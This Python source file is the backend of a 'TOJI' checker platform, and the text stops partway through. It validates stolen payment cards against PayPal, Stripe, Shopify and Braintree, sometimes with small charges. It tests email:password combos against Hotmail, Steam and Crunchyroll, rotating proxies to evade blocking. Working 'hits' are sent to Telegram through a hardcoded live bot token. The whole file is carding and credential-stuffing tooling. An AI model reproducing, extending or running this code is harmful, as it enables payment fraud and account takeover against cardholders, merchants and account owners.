#!/usr/bin/env python3
"""
TOJI Backend API - Complete Checker Platform
Integrates all scripts: PayPal, Stripe, Shopify, Account Checkers
With Proxy Support & Telegram Notifications
"""

import asyncio
import json
import os
import sys
import io

# Fix Windows console encoding issues for emojis and special characters
if sys.stdout.encoding != 'utf-8':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

import base64
import random
import string
import re
import time
import uuid
import requests
import httpx
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple
from pathlib import Path
from urllib.parse import urlparse

from fastapi import FastAPI, HTTPException, Depends, BackgroundTasks, Query
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel, Field
import uvicorn

# Telegram Bot Config
BOT_TOKEN = "8543073349:AAE4g6AcLSgBTEz5b3sXaBJlDIhZnQopVE0"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}"
GROUP_CHAT_ID = "-1003700444046"  # Logs group

# ============== DATA MANAGER & LOCKS ==============

# Global locks for file operations
FILE_LOCKS = {
    "users": asyncio.Lock(),
    "sessions": asyncio.Lock(),
    "proxies": asyncio.Lock()
}

# Global HTTP client
HTTP_CLIENT = httpx.AsyncClient(timeout=30.0)

# Data paths
DATA_DIR = Path(__file__).parent.parent
USERS_FILE = DATA_DIR / "users.json"
SESSIONS_FILE = DATA_DIR / "sessions.json"
PROXIES_FILE = DATA_DIR / "proxies.json"

# ============== DATA MODELS ==============

class CardInput(BaseModel):
    cards: List[str] = Field(..., description="List of cards CC|MM|YYYY|CVV")
    sk_key: Optional[str] = Field(None, description="Stripe SK key")
    proxy_list: Optional[List[str]] = Field(None, description="Proxy list")
    use_proxy: bool = Field(False, description="Use proxies")
    threads: int = Field(10, description="Number of threads")

class AccountInput(BaseModel):
    combos: List[str] = Field(..., description="List of email:password combos")
    proxy_list: Optional[List[str]] = Field(None, description="Proxy list")
    use_proxy: bool = Field(False, description="Use proxies")
    threads: int = Field(10, description="Number of threads")

class SKKeyInput(BaseModel):
    sk_keys: List[str] = Field(..., description="List of SK keys")
    proxy_list: Optional[List[str]] = Field(None, description="Proxy list")

class ProxyInput(BaseModel):
    proxies: List[str] = Field(..., description="List of proxies")

class ShopifyInput(BaseModel):
    cards: List[str] = Field(..., description="Cards to check")
    shopify_url: str = Field(..., description="Shopify store URL")
    proxy_list: Optional[List[str]] = Field(None)
    use_proxy: bool = Field(False)

class StripeAuthInput(BaseModel):
    cards: List[str] = Field(..., description="Cards to check")
    site_url: str = Field(..., description="WooCommerce site URL")
    proxy_list: Optional[List[str]] = Field(None)
    use_proxy: bool = Field(False)

class BraintreeInput(BaseModel):
    cards: List[str] = Field(..., description="Cards to check")
    site_url: str = Field(..., description="WooCommerce site URL")
    proxy_list: Optional[List[str]] = Field(None)
    use_proxy: bool = Field(False)

class SiteGateInput(BaseModel):
    url: str = Field(..., description="URL of the site to analyze")

# ============== PROXY MANAGER ==============

class ProxyManager:
    def __init__(self, proxy_list: Optional[List[str]] = None):
        self.proxy_list = proxy_list if proxy_list else []
        self.current_index = 0
        self.working_proxies = []
        
    def get_proxy(self) -> Optional[Dict]:
        if not self.proxy_list:
            return None
        proxy = self.proxy_list[self.current_index % len(self.proxy_list)]
        self.current_index += 1
        return self._format_proxy(proxy)
    
    def _format_proxy(self, proxy: str) -> Optional[Dict]:
        """Format proxy string to requests format"""
        try:
            # Handle different proxy formats
            if '@' in proxy:
                # Format: user:pass@host:port
                auth, host_port = proxy.split('@')
                proxy_url = f"http://{auth}@{host_port}"
            elif proxy.startswith('http://') or proxy.startswith('https://'):
                proxy_url = proxy
            elif proxy.startswith('socks4://') or proxy.startswith('socks5://'):
                proxy_url = proxy
            else:
                # Assume http://host:port
                proxy_url = f"http://{proxy}"
            
            return {
                'http': proxy_url,
                'https': proxy_url
            }
        except Exception as e:
            print(f"Invalid proxy format: {proxy}, Error: {e}")
            return None
    
    async def test_proxy(self, proxy: str) -> Tuple[bool, float]:
        """Test if proxy is working"""
        formatted = self._format_proxy(proxy)
        if not formatted:
            return False, 0
        
        try:
            start = time.time()
            async with httpx.AsyncClient(proxies=formatted, timeout=10) as client:
                response = await client.get('https://httpbin.org/ip')
                if response.status_code == 200:
                    return True, time.time() - start
            return False, 0
        except:
            return False, 0

# ============== TELEGRAM NOTIFIER ==============

class TelegramNotifier:
    @staticmethod
    async def send_private_hit(user_id: int, title: str, item: str, status: str, response: str, details: Dict = None):
        """Send FULL hit details to user privately"""
        try:
            # Format message
            message = f"🎯 <b>{title} HIT!</b>\n\n📋 <b>Item:</b> <code>{item}</code>\n📊 <b>Status:</b> <b>{status}</b>\n💬 <b>Response:</b> {response}\n"
            if details:
                message += "\n📦 <b>Extra Info:</b>\n"
                for key, value in details.items():
                    if value:
                        message += f"• {key}: <code>{value}</code>\n"
            message += f"\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            
            await HTTP_CLIENT.post(
                f"{TELEGRAM_API}/sendMessage",
                json={"chat_id": user_id, "text": message, "parse_mode": "HTML"}
            )
        except Exception as e:
            print(f"Failed to send private notification: {e}")
    
    @staticmethod
    async def send_group_log(log_type: str, user_id: int, username: str, item_type: str, status: str, amount: str = None):
        """Send activity log to group (NO sensitive data)"""
        try:
            if log_type == "hit":
                message = f"""🎯 <b>NEW HIT!</b>

👤 User: @{username} (ID: {user_id})
📦 Type: {item_type}
📊 Status: <b>{status}</b>
{f"💰 Amount: {amount}" if amount else ""}
⏰ {datetime.now().strftime('%H:%M:%S')}"""
            
            elif log_type == "login":
                message = f"""🔐 <b>USER LOGIN</b>

👤 @{username} (ID: {user_id})
🌐 Logged into TOJI WebApp
⏰ {datetime.now().strftime('%H:%M:%S')}"""
            
            elif log_type == "check":
                message = f"""🔍 <b>CHECK STARTED</b>

👤 @{username} (ID: {user_id})
📦 Type: {item_type}
⏰ {datetime.now().strftime('%H:%M:%S')}"""
            
            else:
                message = f"""📋 <b>ACTIVITY LOG</b>

👤 @{username} (ID: {user_id})
📝 {log_type}
⏰ {datetime.now().strftime('%H:%M:%S')}"""
            
            await HTTP_CLIENT.post(
                f"{TELEGRAM_API}/sendMessage",
                json={
                    "chat_id": GROUP_CHAT_ID,
                    "text": message,
                    "parse_mode": "HTML"
                }
            )
        except Exception as e:
            print(f"Failed to send group log: {e}")

# ============== DATA MANAGER ==============

class DataManager:
    @staticmethod
    def load_json(filepath: Path) -> Dict:
        try:
            with open(filepath, 'r') as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {}
    
    @staticmethod
    async def get_all_users_async() -> Dict:
        lock = FILE_LOCKS.get("users")
        if lock:
            async with lock:
                return DataManager.load_json(USERS_FILE)
        return DataManager.load_json(USERS_FILE)

    @staticmethod
    async def get_all_sessions_async() -> Dict:
        lock = FILE_LOCKS.get("sessions")
        if lock:
            async with lock:
                return DataManager.load_json(SESSIONS_FILE)
        return DataManager.load_json(SESSIONS_FILE)
    
    @staticmethod
    async def save_json_async(filepath: Path, data: Dict, lock_key: str):
        """Asynchronously save JSON with file locking"""
        lock = FILE_LOCKS.get(lock_key)
        if lock:
            async with lock:
                with open(filepath, 'w') as f:
                    json.dump(data, f, indent=2)
        else:
            # Fallback for keys that don't have a specific lock
            with open(filepath, 'w') as f:
                json.dump(data, f, indent=2)
    
    @staticmethod
    async def get_user_async(user_id: int) -> Optional[Dict]:
        lock = FILE_LOCKS.get("users")
        async with lock:
            users = DataManager.load_json(USERS_FILE)
            return users.get(str(user_id))
    
    @staticmethod
    async def validate_session_async(session_token: str) -> Optional[Dict]:
        lock = FILE_LOCKS.get("sessions")
        async with lock:
            sessions = DataManager.load_json(SESSIONS_FILE)
            if session_token not in sessions:
                return None
            
            session = sessions[session_token]
            expires_at = datetime.fromisoformat(session['expires_at'])
            
            if datetime.now() > expires_at:
                session['active'] = False
                await DataManager.save_json_async(SESSIONS_FILE, sessions, "sessions")
                return None
            
            session['last_activity'] = datetime.now().isoformat()
            await DataManager.save_json_async(SESSIONS_FILE, sessions, "sessions")
            
            return session

# ============== CHECKER CLASSES ==============

class PayPalCVVChecker:
    """PayPal CVV Checker - from paypalcvv.py"""
    
    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
        self.proxy_manager = proxy_manager
        self.session = requests.Session()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
    
    async def check_card(self, card_line: str, user_id: int = None, username: str = None) -> Dict:
        """Check card with PayPal CVV"""
        try:
            # Import real script wrapper
            from script_wrappers import check_paypal_cvv
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')  # Extract proxy URL
            
            # Call REAL script
            result = await check_paypal_cvv(card_line, proxy=proxy)
            
            # Add card to result
            result['card'] = card_line
            
            # Send Telegram notifications if hit
            if result['status'] in ['CHARGED', 'APPROVED'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="PayPal CVV",
                    item=card_line,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="PayPal CVV",
                    status=result['status']
                )
            
            return result
            
        except Exception as e:
            return {
                "card": card_line,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }


class PayPalChargeChecker:
    """PayPal $0.1 Charge Checker - from paypal checker.py"""
    
    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
        self.proxy_manager = proxy_manager
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        ]
    
    async def check_card(self, card_line: str, user_id: int = None, username: str = None) -> Dict:
        """Check card with $0.1 charge"""
        try:
            # Import real script wrapper
            from script_wrappers import check_paypal_charge
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_paypal_charge(card_line, proxy=proxy)
            
            # Add card to result
            result['card'] = card_line
            
            # Send Telegram notifications if hit
            if result['status'] in ['CHARGED', 'APPROVED'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="PayPal $0.1",
                    item=card_line,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="PayPal $0.1",
                    status=result['status'],
                    amount="$0.10"
                )
            
            return result
            
        except Exception as e:
            return {
                "card": card_line,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }


class StripeSKChecker:
    """Stripe SK Based Checker - from stripe_checker_fixed.py"""
    
    def __init__(self, sk_key: str, proxy_manager: Optional[ProxyManager] = None):
        self.sk_key = sk_key
        self.proxy_manager = proxy_manager
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        ]
    
    async def check_card(self, card_line: str, user_id: int = None, username: str = None) -> Dict:
        """Check card with Stripe SK"""
        try:
            # Import real script wrapper
            from script_wrappers import check_stripe_sk
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_stripe_sk(card_line, self.sk_key, proxy=proxy)
            
            # Add card to result
            result['card'] = card_line
            
            # Send Telegram notifications if hit
            if result['status'] in ['APPROVED', 'LIVE'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Stripe SK",
                    item=card_line,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Stripe SK",
                    status=result['status']
                )
            
            return result
            
        except Exception as e:
            return {
                "card": card_line,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }


class StripeAuthChecker:
    """Auto Stripe Auth - from auto stripe auth.py"""
    
    def __init__(self, site_url: str, proxy_manager: ProxyManager = None):
        self.site_url = site_url
        self.proxy_manager = proxy_manager
    
    async def check_card(self, card_line: str, user_id: int = None, username: str = None) -> Dict:
        """Check card with Stripe Auth"""
        try:
            # Import real script wrapper
            from script_wrappers import check_stripe_auth
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_stripe_auth(self.site_url, card_line, proxy=proxy)
            
            # Add card to result
            result['card'] = card_line
            
            # Send Telegram notifications if hit
            if result['status'] in ['APPROVED', 'LIVE'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Stripe Auth",
                    item=card_line,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Stripe Auth",
                    status=result['status']
                )
            
            return result
            
        except Exception as e:
            return {
                "card": card_line,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }


class ShopifyChecker:
    """Auto Shopify Checkout - from shopify_auto_checkout.py"""
    
    def __init__(self, shopify_url: str, proxy_manager: Optional[ProxyManager] = None):
        self.shopify_url = shopify_url
        self.proxy_manager = proxy_manager
    
    async def check_card(self, card_line: str, user_id: int = None, username: str = None) -> Dict:
        """Check card with Shopify"""
        try:
            # Import real script wrapper
            from script_wrappers import check_shopify
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_shopify(card_line, self.shopify_url, proxy=proxy)
            
            # Add card to result
            result['card'] = card_line
            
            # Send Telegram notifications if hit
            if result['status'] in ['CHARGED', 'APPROVED'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Shopify",
                    item=card_line,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Shopify",
                    status=result['status']
                )
            
            return result
            
        except Exception as e:
            return {
                "card": card_line,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }

class StripeAutoHitter:
    """Stripe Auto Hitter - from STRIPE AUTO HITTER.py"""
    
    def __init__(self, checkout_url: Optional[str] = None, pk: Optional[str] = None, cs: Optional[str] = None, proxy_manager: Optional[ProxyManager] = None):
        self.checkout_url = checkout_url
        self.pk = pk
        self.cs = cs
        self.proxy_manager = proxy_manager
    
    async def check_card(self, card_line: str, user_id: int = None, username: str = None) -> Dict:
        """Mass check cards with Stripe"""
        try:
            # Import real script wrapper
            from script_wrappers import check_stripe_hitter
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Use checkout_url if provided, otherwise fail
            if not self.checkout_url:
                return {"card": card_line, "status": "ERROR", "message": "No checkout URL provided"}
                
            # Call REAL script
            result = await check_stripe_hitter(card_line, self.checkout_url, proxy=proxy)
            
            # Add card to result
            result['card'] = card_line
            
            # Send Telegram notifications if hit
            if result['status'] in ['CHARGED', 'APPROVED', 'LIVE'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Stripe AutoHitter",
                    item=card_line,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Stripe AutoHitter",
                    status=result['status']
                )
            
            return result
            
        except Exception as e:
            return {
                "card": card_line,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }

class BraintreeChecker:
    """Braintree Automated Checker - from gates/braintree auto auth/main.py"""
    
    def __init__(self, site_url: str, proxy_manager: Optional[ProxyManager] = None):
        self.site_url = site_url
        self.proxy_manager = proxy_manager
    
    async def check_card(self, card_line: str, user_id: Optional[int] = None, username: Optional[str] = None) -> Dict:
        """Check card with Braintree Auth"""
        try:
            # Import real script wrapper
            from script_wrappers import check_braintree
            
            # Get proxy if enabled
            proxy = None
            pm = self.proxy_manager
            if pm:
                proxy_dict = pm.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_braintree(card_line, self.site_url, proxy=proxy)
            
            # Add card to result
            result['card'] = card_line
            
            # Send Telegram notifications if hit
            if result['status'] in ['CHARGED', 'APPROVED', 'LIVE'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Braintree Auth",
                    item=card_line,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Braintree",
                    status=result['status']
                )
            
            return result
            
        except Exception as e:
            return {
                "card": card_line,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }

class SKKeyChecker:
    """SK Key Checker - validates Stripe keys"""
    
    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
        self.proxy_manager = proxy_manager
    
    async def check_key(self, sk_key: str) -> Dict:
        """Validate SK key"""
        try:
            # Import real script wrapper
            from script_wrappers import check_sk_key
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_sk_key(sk_key, proxy=proxy)
            
            # Add key to result
            result['key'] = sk_key
            
            return result
                    
        except Exception as e:
            return {"key": sk_key, "valid": False, "message": str(e)}

class HotmailChecker:
    """Microsoft Hotmail Account Checker - from advanced_hotmail_checker.py"""
    
    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
        self.proxy_manager = proxy_manager
    
    async def check_account(self, combo: str, user_id: Optional[int] = None, username: Optional[str] = None) -> Dict:
        """Check Hotmail account"""
        try:
            # Import real script wrapper
            from script_wrappers import check_hotmail
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_hotmail(combo, proxy=proxy)
            
            # Add combo to result
            result['combo'] = combo
            
            # Send Telegram notifications if hit
            if result['status'] in ['HIT', 'LIVE'] and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Hotmail Account",
                    item=combo,
                    status=result['status'],
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Hotmail",
                    status=result['status']
                )
            
            return result
            
        except Exception as e:
            return {
                "combo": combo,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }


class SteamChecker:
    """Steam Account Checker - from steam_checker.py"""
    
    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
        self.proxy_manager = proxy_manager
    
    async def check_account(self, combo: str, user_id: Optional[int] = None, username: Optional[str] = None) -> Dict:
        """Check Steam account"""
        try:
            # Import real script wrapper
            from script_wrappers import check_steam
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_steam(combo, proxy=proxy)
            
            # Add combo to result
            result['combo'] = combo
            
            # Send Telegram notifications if hit
            if result['status'] == 'HIT' and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Steam Account",
                    item=combo,
                    status="HIT",
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Steam",
                    status="HIT"
                )
            
            return result
                
        except Exception as e:
            return {
                "combo": combo,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }

class CrunchyrollChecker:
    """Crunchyroll Account Checker - from crunchyroll_checekr.py"""
    
    def __init__(self, proxy_manager: Optional[ProxyManager] = None):
        self.proxy_manager = proxy_manager
    
    async def check_account(self, combo: str, user_id: Optional[int] = None, username: Optional[str] = None) -> Dict:
        """Check Crunchyroll account"""
        try:
            # Import real script wrapper
            from script_wrappers import check_crunchyroll
            
            # Get proxy if enabled
            proxy = None
            if self.proxy_manager:
                proxy_dict = self.proxy_manager.get_proxy()
                if proxy_dict:
                    proxy = proxy_dict.get('http')
            
            # Call REAL script
            result = await check_crunchyroll(combo, proxy=proxy)
            
            # Add combo to result
            result['combo'] = combo
            
            # Send Telegram notifications if hit
            if result['status'] == 'HIT' and user_id and username:
                await TelegramNotifier.send_private_hit(
                    user_id=user_id,
                    title="Crunchyroll Account",
                    item=combo,
                    status="HIT",
                    response=result['message'],
                    details=result.get('details', {})
                )
                await TelegramNotifier.send_group_log(
                    log_type="hit",
                    user_id=user_id,
                    username=username,
                    item_type="Crunchyroll",
                    status="HIT"
                )
            
            return result
                
        except Exception as e:
            return {
                "combo": combo,
                "status": "ERROR",
                "message": str(e),
                "details": {}
            }

class SiteGateChecker:
    """Advanced Site Gate & Technology Checker"""
    
    async def check_site(self, url: str) -> Dict:
        """Analyze site for gateways and technology"""
        try:
            from script_wrappers import check_site_gate
            return await check_site_gate(url)
        except Exception as e:
            return {"status": "ERROR", "message": str(e)}

# ============== FASTAPI APP ==============

app = FastAPI(
    title="TOJI Backend API",
    description="Advanced Checker Platform with All Scripts",
    version="2.0.0"
)

# Fix CORS
app.add_middleware(
    CORSMiddleware,
    allow_origins=[
        "http://localhost:5173",
        "http://127.0.0.1:5173",
        "https://a5cqaelblt54g.ok.kimi.link",
        "https://kimi.link",
    ],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
    expose_headers=["*"],  # Allow browser to read response headers
    max_age=3600,  # Cache preflight for 1 hour
)

# Ensure script_wrappers can be imported
sys.path.append(str(Path(__file__).parent))

async def get_current_session(session_token: str = Query(..., description="Session token from bot")):
    print(f"[AUTH] Validating session token: {session_token[:30] if session_token else 'NONE'}...")
    
    if not session_token:
        print("[AUTH] Error: No session token provided")
        raise HTTPException(status_code=401, detail="No session token provided")
    
    session = await DataManager.validate_session_async(session_token)
    if not session:
        print("[AUTH] Error: Invalid or expired session")
        raise HTTPException(status_code=401, detail="Invalid or expired session. Please create a new session from the bot.")
    
    print(f"[AUTH] Session valid for user: {session.get('username')} (ID: {session.get('user_id')})")
    
    # Send login log to group
    try:
        await TelegramNotifier.send_group_log(
            "login", session["user_id"], session.get("username", "Unknown"), "", ""
        )
    except Exception as e:
        print(f"[AUTH] Warning: Failed to send group log: {e}")
    
    return session

@app.get("/")
async def root():
    return {"name": "TOJI Backend API", "version": "2.0.0", "status": "running"}

@app.get("/api/session/validate")
async def validate_session_endpoint(session_token: str = Query(...)):
    session = await DataManager.validate_session_async(session_token)
    
    if not session:
        return {"valid": False, "message": "Invalid or expired session"}
    
    return {
        "valid": True,
        "user_id": session.get("user_id"),
        "username": session.get("username"),
        "expires_at": session.get("expires_at"),
        "message": "Session valid"
    }

# ============== CC CHECKER BACKGROUND LOGIC ==============

async def run_paypal_cvv_check(checker: PayPalCVVChecker, cards: List[str], user_id: int, username: str):
    for card in cards:
        await checker.check_card(card, user_id, username)

async def run_paypal_charge_check(checker: PayPalChargeChecker, cards: List[str], user_id: int, username: str):
    for card in cards:
        await checker.check_card(card, user_id, username)

async def run_stripe_sk_check(checker: StripeSKChecker, cards: List[str], user_id: int, username: str):
    for card in cards:
        await checker.check_card(card, user_id, username)

async def run_stripe_auth_check(checker: StripeAuthChecker, cards: List[str], user_id: int, username: str):
    for card in cards:
        await checker.check_card(card, user_id, username)

async def run_shopify_check(checker: ShopifyChecker, cards: List[str], user_id: int, username: str):
    for card in cards:
        await checker.check_card(card, user_id, username)

async def run_stripe_hitter_check(checker: StripeAutoHitter, cards: List[str], user_id: int, username: str):
    for card in cards:
        await checker.check_card(card, user_id, username)

async def run_hotmail_check(checker: HotmailChecker, combos: List[str], user_id: int, username: str):
    for combo in combos:
        await checker.check_account(combo, user_id, username)

async def run_steam_check(checker: SteamChecker, combos: List[str], user_id: int, username: str):
    for combo in combos:
        await checker.check_account(combo, user_id, username)

async def run_crunchyroll_check(checker: CrunchyrollChecker, combos: List[str], user_id: int, username: str):
    for combo in combos:
        await checker.check_account(combo, user_id, username)

# ============== CC CHECKER ENDPOINTS ==============

@app.post("/api/checker/paypal-cvv")
async def paypal_cvv_checker(
    data: CardInput,
    background_tasks: BackgroundTasks,
    session: Dict = Depends(get_current_session)
):
    """PayPal CVV Checker"""
    try:
        print(f"[PayPal CVV] Checking {len(data.cards)} cards for user {session.get('username')}")
        proxy_manager = ProxyManager(data.proxy_list) if data.use_proxy and data.proxy_list else None
        checker = PayPalCVVChecker(proxy_manager)
        
        # Sync check (await all results) to fix pending issue
        results = []
        for card in data.cards:
            res = await checker.check_card(card, session["user_id"], session.get("username"))
            results.append(res)
        
        return {
            "success": True,
            "message": "Check complete",
            "results": results
        }
    except Exception as e:
        print(f"[PayPal CVV] Error: {e}")
        raise HTTPException(status_code=500, detail=f"Checker error: {str(e)}")

@app.post("/api/checker/paypal-charge")
async def paypal_charge_checker(
    data: CardInput,
    session: Dict = Depends(get_current_session)
):
    """PayPal $0.1 Charge Checker"""
    try:
        print(f"[PayPal Charge] Checking {len(data.cards)} cards for user {session.get('username')}")
        proxy_manager = ProxyManager(data.proxy_list) if data.use_proxy and data.proxy_list else None
        checker = PayPalChargeChecker(proxy_manager)
        
        # Sync check (await all results) to fix pending issue
        results = []
        for card in data.cards:
            res = await checker.check_card(card, session["user_id"], session.get("username"))
            results.append(res)
        
        return {
            "success": True,
            "message": "Check complete",
            "results": results
        }
    except Exception as e:
        print(f"[PayPal Charge] Error: {e}")
        raise HTTPException(status_code=500, detail=f"Checker error: {str(e)}")

@app.post("/api/checker/stripe-sk")
async def stripe_sk_checker(
    data: CardInput,
    session: Dict = Depends(get_current_session)
):
    """Stripe SK Based Checker"""
    try:
        if not data.sk_key:
            raise HTTPException(status_code=400, detail="SK key required")
        
        print(f"[Stripe SK] Checking {len(data.cards)} cards for user {session.get('username')}")
        proxy_manager = ProxyManager(data.proxy_list) if data.use_proxy and data.proxy_list else None
        checker = StripeSKChecker(data.sk_key, proxy_manager)
        
        # Sync check (await all results) to fix pending issue
        results = []
        for card in data.cards:
            res = await checker.check_card(card, session["user_id"], session.get("username"))
            results.append(res)
        
        return {
            "success": True,
            "message": "Check complete",
            "results": results
        }
    except HTTPException:
        raise
    except Exception as e:
        print(f"[Stripe SK] Error: {e}")
        raise HTTPException(status_code=500, detail=f"Checker error: {str(e)}")

@app.post("/api/checker/stripe-auth")
async def stripe_auth_checker(
    data: StripeAuthInput,
    session: Dict = Depends(get_current_session)
):
    """Auto Stripe Auth Checker"""
    try:
        print(f"[Stripe Auth] Checking {len(data.cards)} cards for user {session.get('username')}")
        proxy_manager = ProxyManager(data.proxy_list) if data.use_proxy and data.proxy_list else None
        checker = StripeAuthChecker(data.site_url, proxy_manager)
        
        # Sync check (await all results) to fix pending issue
        results = []
        for card in data.cards:
            res = await checker.check_card(card, session["user_id"], session.get("username"))
            results.append(res)
        
        return {
            "success": True,
            "message": "Check complete",
            "results": results
        }
    except Exception as e:
        print(f"[Stripe Auth] Error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/checker/shopify")
async def shopify_checker(
    data: ShopifyInput,
    session: Dict = Depends(get_current_session)
):
    """Auto Shopify Checkout"""
    try:
        print(f"[Shopify] Checking {len(data.cards)} cards for user {session.get('username')}")
        proxy_manager = ProxyManager(data.proxy_list) if data.use_proxy and data.proxy_list else None
        checker = ShopifyChecker(data.shopify_url, proxy_manager)
        
        # Sync check (await all results) to fix pending issue
        results = []
        for card in data.cards:
            res = await checker.check_card(card, session["user_id"], session.get("username"))
            results.append(res)
        
        return {
            "success": True,
            "message": "Check complete",
            "results": results
        }
    except Exception as e:
        print(f"[Shopify] Error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@app.post("/api/checker/stripe-hitter")
async def stripe_hitter_checker(
    data: CardInput,
    session: Dict = Depends(get_current_session)
):
    """Stripe Auto Hitter"""
    try:
        print(f"[Stripe Hitter] Checking {len(data.cards)} cards for user {session.get('username')}")
        proxy_manager = ProxyManager(data.proxy_list) if data.use_proxy and data.proxy_list else None
        checker = StripeAutoHitter(data.sk_key, None, None, proxy_manager)
        
        # Sync check (await all results) to fix pending issue
        results = []
        for card in data.cards:
            res = await checker.check_card(card, session["user_id"], session.get("username"))
            results.append(res)
        
        return {
            "success": True,
            "message": "Check complete",
            "results": results
        }
    except Exception as e:
        print(f"[Stripe Hitter] Error: {e}")
        raise HTTPException(status_code=500, detail=str(e))

# Braintree Automated Checker
@app.post("/api/checkers/braintree")
async def braintree_checker(
    data: BraintreeInput,
    session: Dict = Depends(get_current_session)
):
    try:
        print(f"[Braintree] Checking {len(data.cards)} cards for user {session.get('username')}")
